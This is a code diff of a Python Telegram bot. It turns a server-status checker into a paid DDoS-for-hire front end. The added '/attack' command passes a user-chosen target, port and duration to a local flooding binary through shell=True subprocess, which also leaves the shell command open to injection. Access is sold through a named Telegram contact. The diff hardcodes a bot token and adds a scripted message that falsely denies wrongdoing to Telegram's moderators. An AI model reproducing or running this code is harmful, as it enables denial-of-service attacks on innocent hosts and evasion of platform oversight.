@@ -1,311 +1,241 @@
 import telebot
-import os
+import subprocess
 import datetime
+import os
+import time
 import requests
 import platform
 import socket
-import re
-from typing import List
 
-# Securely load bot token from environment variable
-BOT_TOKEN = os.getenv("6913030366:AAEtMr3xpYaioIzEk7iYT_Mio7YgXrEjluE")
-if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN environment variable not set.")
+bot_tokens = ['6913030366:AAEtMr3xpYaioIzEk7iYT_Mio7YgXrEjluE']
+admin_ids = ["7383077317"]
 
-# Configuration
-ADMIN_IDS: List[str] = ["7383077317"]  # Admin Telegram IDs
-ALLOWED_USER_IDS: List[str] = []  # Dynamically loaded from users.txt
-LOG_FILE: str = "log.txt"
-USERS_FILE: str = "users.txt"
+allowed_user_ids = []
 
-# Initialize bot
-try:
-    bot = telebot.TeleBot(BOT_TOKEN)
-except Exception as e:
-    raise ValueError(f"Failed to initialize bot: {e}")
+bots = [telebot.TeleBot(token) for token in bot_tokens]
 
-# Utility Functions
-def get_ip_info(ip: str) -> str:
-    """Fetch geolocation data for an IP address."""
+def get_ip_info(ip):
     try:
-        response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
-        return f"{response.get('city', 'Unknown')}, {response.get('country_name', 'Unknown')}"
-    except requests.RequestException:
+        response = requests.get(f"https://ipapi.co/{ip}/json/").json()
+        return response.get("city", "Unknown") + ", " + response.get("country_name", "Unknown")
+    except:
         return "Unknown"
 
-def get_device_info() -> str:
-    """Get the operating system of the host machine."""
+def get_device_info():
     return platform.system()
 
-def is_host_alive(ip: str, port: int) -> str:
-    """Check if a host is reachable on a specific port."""
+def is_host_alive(ip, port):
     try:
         with socket.create_connection((ip, port), timeout=2):
             return "Alive"
-    except (socket.timeout, socket.gaierror, ConnectionRefusedError):
+    except:
         return "Offline"
 
-def log_user_activity(log_data: str, user_id: str) -> None:
-    """Log user activity to log.txt for non-admin users."""
-    if user_id not in ADMIN_IDS:
-        try:
-            with open(LOG_FILE, "a", encoding="utf-8") as file:
-                file.write(f"{log_data}\n")
-        except IOError as e:
-            print(f"Error writing to log file: {e}")
+def log_user_activity(log_data, user_id=None):
+    if user_id not in admin_ids:
+        with open("log.txt", "a") as file:
+            file.write(log_data + "\n")
 
-def load_allowed_users() -> None:
-    """Load allowed user IDs from users.txt."""
-    global ALLOWED_USER_IDS
-    try:
-        if os.path.exists(USERS_FILE):
-            with open(USERS_FILE, "r", encoding="utf-8") as file:
-                ALLOWED_USER_IDS = [line.strip() for line in file if line.strip()]
-    except IOError as e:
-        print(f"Error reading users file: {e}")
-
-def validate_ip(ip: str) -> bool:
-    """Validate IP address format."""
-    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
-    return bool(re.match(ip_pattern, ip))
-
-def validate_port(port: int) -> bool:
-    """Validate port number."""
-    return 1 <= port <= 65535
-
-# Load allowed users at startup
-load_allowed_users()
-
-# Bot Command Handlers
-def create_handlers(bot: telebot.TeleBot) -> None:
+def create_handlers(bot):
     @bot.message_handler(commands=['start'])
     def start_command(message):
         user_id = str(message.chat.id)
         full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
         username = message.from_user.username or "NoUsername"
-        if user_id in ADMIN_IDS:
+        if user_id in admin_ids:
             bot.reply_to(message, (
-                f"Hello {full_name} (ID: {user_id}),\n\n"
-                "Welcome to the bot! You are an admin. Use /help to see available commands."
-            ))
-        elif user_id in ALLOWED_USER_IDS:
-            bot.reply_to(message, (
-                f"Hello {full_name},\n\n"
-                "You are authorized to use this bot. Use /help for commands."
+                f"dear {user_id}, \n\n"
+                "Subject: Clarification Regarding Channel Content and Bot Use\n\n"
+                "Dear Telegram Team,\n\n"
+                "I would like to clarify that my channel and bot do not support, promote, or engage in any illegal activities, including the sale of real-world firearms or prohibited goods. "
+                "Any mention of terms such as 'guns', 'gunlabs', or similar references pertains exclusively to in-game items from PlayerUnknown's Battlegrounds (PUBG) and Battlegrounds Mobile India, "
+                "and has no connection to real-life weapons or illegal transactions.\n\n"
+                "I fully respect Telegram’s policies and am committed to ensuring that my bot and channel remain focused on gaming-related discussions and virtual in-game transactions.\n\n"
+                "Thank you for your attention and support."
             ))
         else:
-            bot.reply_to(message, (
-                "You are not authorized to use this bot.\n"
-                "Contact @spoliator_personal or visit our Telegram channel: https://t.me/Linuxcode_channel."
-            ))
+            bot.reply_to(message, "You are not authorized to use this bot : buy @spoliator_personal & visit our telegram channel : https://t.me/Linuxcode_channel.")
 
     @bot.message_handler(commands=['add'])
     def add_user(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS:
-            bot.reply_to(message, "Only admins can use this command.")
-            return
-
-        command = message.text.split()
-        if len(command) != 2:
-            bot.reply_to(message, "Usage: /add <userId>")
-            return
-
-        user_to_add = command[1].strip()
-        if not user_to_add.isdigit():
-            bot.reply_to(message, "User ID must be a number.")
-            return
-
-        if user_to_add in ALLOWED_USER_IDS:
-            bot.reply_to(message, "User already authorized.")
-            return
-
-        ALLOWED_USER_IDS.append(user_to_add)
-        try:
-            with open(USERS_FILE, "a", encoding="utf-8") as file:
-                file.write(f"{user_to_add}\n")
-            bot.reply_to(message, f"User {user_to_add} added successfully.")
-        except IOError as e:
-            bot.reply_to(message, f"Error adding user: {e}")
+        if user_id in admin_ids:
+            command = message.text.split()
+            if len(command) > 1:
+                user_to_add = command[1]
+                if user_to_add not in allowed_user_ids:
+                    allowed_user_ids.append(user_to_add)
+                    with open("users.txt", "a") as file:
+                        file.write(f"{user_to_add}\n")
+                    response = f"User {user_to_add} added successfully."
+                else:
+                    response = "User already exists."
+            else:
+                response = "Please specify a user ID to add."
+        else:
+            response = "ONLY OWNER CAN USE."
+        bot.reply_to(message, response)
 
     @bot.message_handler(commands=['remove'])
     def remove_user(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS:
-            bot.reply_to(message, "Only admins can use this command.")
-            return
-
-        command = message.text.split()
-        if len(command) != 2:
-            bot.reply_to(message, "Usage: /remove <userId>")
-            return
-
-        user_to_remove = command[1].strip()
-        if user_to_remove not in ALLOWED_USER_IDS:
-            bot.reply_to(message, f"User {user_to_remove} not found in authorized list.")
-            return
-
-        ALLOWED_USER_IDS.remove(user_to_remove)
-        try:
-            with open(USERS_FILE, "w", encoding="utf-8") as file:
-                for uid in ALLOWED_USER_IDS:
-                    file.write(f"{uid}\n")
-            bot.reply_to(message, f"User {user_to_remove} removed successfully.")
-        except IOError as e:
-            bot.reply_to(message, f"Error removing user: {e}")
+        if user_id in admin_ids:
+            command = message.text.split()
+            if len(command) > 1:
+                user_to_remove = command[1]
+                if user_to_remove in allowed_user_ids:
+                    allowed_user_ids.remove(user_to_remove)
+                    with open("users.txt", "w") as file:
+                        for uid in allowed_user_ids:
+                            file.write(f"{uid}\n")
+                    response = f"User {user_to_remove} removed."
+                else:
+                    response = f"User {user_to_remove} not found in the list."
+            else:
+                response = "Usage: /remove <userid>"
+        else:
+            response = "ONLY OWNER CAN USE."
+        bot.reply_to(message, response)
 
     @bot.message_handler(commands=['clearlogs'])
     def clear_logs_command(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS:
-            bot.reply_to(message, "Only admins can use this command.")
-            return
-
-        try:
-            if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
-                bot.reply_to(message, "Logs are already empty.")
-                return
-            with open(LOG_FILE, "w", encoding="utf-8"):
-                pass  # Truncate file
-            bot.reply_to(message, "Logs cleared successfully.")
-        except IOError as e:
-            bot.reply_to(message, f"Error clearing logs: {e}")
+        if user_id in admin_ids:
+            try:
+                with open("log.txt", "r+") as file:
+                    log_content = file.read()
+                    if log_content.strip() == "":
+                        response = "Logs are already cleared. No data found."
+                    else:
+                        file.seek(0)
+                        file.truncate()
+                        response = "Logs cleared successfully."
+            except FileNotFoundError:
+                response = "Logs are already cleared."
+        else:
+            response = "ONLY OWNER CAN USE."
+        bot.reply_to(message, response)
 
     @bot.message_handler(commands=['allusers'])
     def show_all_users(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS:
-            bot.reply_to(message, "Only admins can use this command.")
-            return
-
-        if not ALLOWED_USER_IDS:
-            bot.reply_to(message, "No authorized users found.")
-            return
-
-        response = "Authorized Users:\n" + "\n".join(f"- {uid}" for uid in ALLOWED_USER_IDS)
+        if user_id in admin_ids:
+            try:
+                with open("users.txt", "r") as file:
+                    user_ids = file.read().splitlines()
+                    if user_ids:
+                        response = "Authorized Users:\n" + "\n".join(f"- {uid}" for uid in user_ids)
+                    else:
+                        response = "No data found."
+            except FileNotFoundError:
+                response = "No data found."
+        else:
+            response = "ONLY OWNER CAN USE."
         bot.reply_to(message, response)
 
     @bot.message_handler(commands=['logs'])
     def show_recent_logs(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS:
-            bot.reply_to(message, "Only admins can use this command.")
-            return
-
-        if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
-            bot.reply_to(message, "No logs found.")
-            return
-
-        try:
-            with open(LOG_FILE, "rb") as file:
-                bot.send_document(message.chat.id, file, caption="Log File")
-        except Exception as e:
-            bot.reply_to(message, f"Error sending logs: {e}")
+        if user_id in admin_ids:
+            if os.path.exists("log.txt") and os.stat("log.txt").st_size > 0:
+                try:
+                    with open("log.txt", "rb") as file:
+                        bot.send_document(message.chat.id, file)
+                    return
+                except Exception:
+                    response = "Could not send logs."
+            else:
+                response = "No data found."
+        else:
+            response = "ONLY OWNER CAN USE."
+        bot.reply_to(message, response)
 
     @bot.message_handler(commands=['id'])
     def show_user_id(message):
         user_id = str(message.chat.id)
         bot.reply_to(message, f"Your ID: {user_id}")
 
-    @bot.message_handler(commands=['check'])
-    def check_server(message):
+    @bot.message_handler(commands=['attack'])
+    def handle_attack(message):
         user_id = str(message.chat.id)
-        if user_id not in ADMIN_IDS and user_id not in ALLOWED_USER_IDS:
-            bot.reply_to(message, (
-                "Unauthorized. Contact @spoliator_personal or visit: "
-                "https://t.me/Linuxcode_channel."
-            ))
-            return
-
-        command = message.text.split()
-        if len(command) != 3:
-            bot.reply_to(message, "Usage: /check <ip> <port>")
-            return
-
-        ip, port_str = command[1], command[2]
-        if not validate_ip(ip):
-            bot.reply_to(message, "Invalid IP address format.")
-            return
-
-        try:
-            port = int(port_str)
-            if not validate_port(port):
-                bot.reply_to(message, "Port must be between 1 and 65535.")
-                return
-        except ValueError:
-            bot.reply_to(message, "Port must be a number.")
-            return
-
         full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}".strip()
         username = message.from_user.username or "NoUsername"
-        status = is_host_alive(ip, port)
-        location = get_ip_info(ip)
-        device = get_device_info()
-        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
-        response = f"Server {ip}:{port} is {status}."
 
-        # Log activity for non-admins
-        if user_id not in ADMIN_IDS:
-            log_line = (
-                f"{timestamp} Name: {full_name} | Username: @{username} | "
-                f"UserID: {user_id} | IP: {ip} | Port: {port} | "
-                f"Status: {status} | Device: {device} | Location: {location}"
-            )
-            log_user_activity(log_line, user_id)
+        if user_id in admin_ids or user_id in allowed_user_ids:
+            command = message.text.split()
+            if len(command) == 4:
+                target = command[1]
+                port = int(command[2])
+                duration = int(command[3])
+                if duration > 380:
+                    response = "Error: Time interval must be less than 380."
+                else:
+                    response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
+                    full_command = f"./su {target} {port} {duration} 1800"
+                    subprocess.Popen(full_command, shell=True)
 
+                    # Log if not admin
+                    if user_id not in admin_ids:
+                        ip = target
+                        status = is_host_alive(ip, port)
+                        location = get_ip_info(ip)
+                        device = get_device_info()
+                        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
+                        log_line = (
+                            f"{timestamp} Name: {full_name} | Username: @{username} | "
+                            f"UserID: {user_id} | IP: {ip} | Port: {port} | Time: {duration}s | "
+                            f"Status: {status} | Bot: {bot_tokens.index(bot.token)+1} | "
+                            f"Device: {device} | Location: {location}"
+                        )
+                        log_user_activity(log_line, user_id)
+            else:
+                response = "Usage: /attack <target> <port> <time>."
+        else:
+            response = "🤡 Access expired or unauthorized : buy @spoliator_personal & visit our telegram channel : https://t.me/Linuxcode_channel."
         bot.reply_to(message, response)
 
     @bot.message_handler(commands=['mylogs'])
     def show_command_logs(message):
         user_id = str(message.chat.id)
-        if user_id in ADMIN_IDS:
-            bot.reply_to(message, "Admins are anonymous. No logs stored.")
-            return
-
-        try:
-            if not os.path.exists(LOG_FILE):
-                bot.reply_to(message, "No logs found.")
-                return
-            with open(LOG_FILE, "r", encoding="utf-8") as file:
-                logs = file.readlines()
-                user_logs = [log for log in logs if f"UserID: {user_id}" in log]
-                if not user_logs:
-                    bot.reply_to(message, "No logs found for you.")
-                    return
-                bot.reply_to(message, "".join(user_logs))
-        except IOError as e:
-            bot.reply_to(message, f"Error reading logs: {e}")
+        if user_id in admin_ids:
+            response = "Admin is anonymous. No logs stored."
+        else:
+            try:
+                with open("log.txt", "r") as file:
+                    logs = file.readlines()
+                    user_logs = [log for log in logs if f"UserID: {user_id}" in log]
+                    response = "".join(user_logs) if user_logs else "No Command Logs Found For You."
+            except FileNotFoundError:
+                response = "No command logs found."
+        bot.reply_to(message, response)
 
     @bot.message_handler(commands=['help'])
     def show_help(message):
         help_text = '''
 Available Commands:
-/start : Welcome message
-/check <ip> <port> : Check server status
-/add <userId> : Add authorized user (admin only)
-/remove <userId> : Remove authorized user (admin only)
-/clearlogs : Clear logs (admin only)
-/allusers : List authorized users (admin only)
-/logs : Download logs (admin only)
+/attack <target> <port> <time> : Launch attack
+/add <userId> : Add authorized user
+/remove <userId> : Remove authorized user
+/clearlogs : Clear all logs
+/allusers : List authorized users
+/logs : Download all logs
 /id : Show your user ID
-/mylogs : Show your logs
-/help : Show this help
+/mylogs : Show your own logs
 '''
         bot.reply_to(message, help_text)
 
-# Register handlers
-create_handlers(bot)
+for bot in bots:
+    create_handlers(bot)
 
-# Run bot
-def run_bot():
-    print("Bot is running...")
+def run_bots():
     while True:
-        try:
-            bot.polling(none_stop=True, interval=0)
-        except Exception as e:
-            print(f"Bot polling error: {e}")
-            import time
-            time.sleep(5)
+        for bot in bots:
+            try:
+                bot.polling(none_stop=True)
+            except Exception as e:
+                print(f"Error in Bot: {e}")
+                time.sleep(5)
 
 if __name__ == "__main__":
-    run_bot()
+    print("Bot is running...")
+    run_bots()
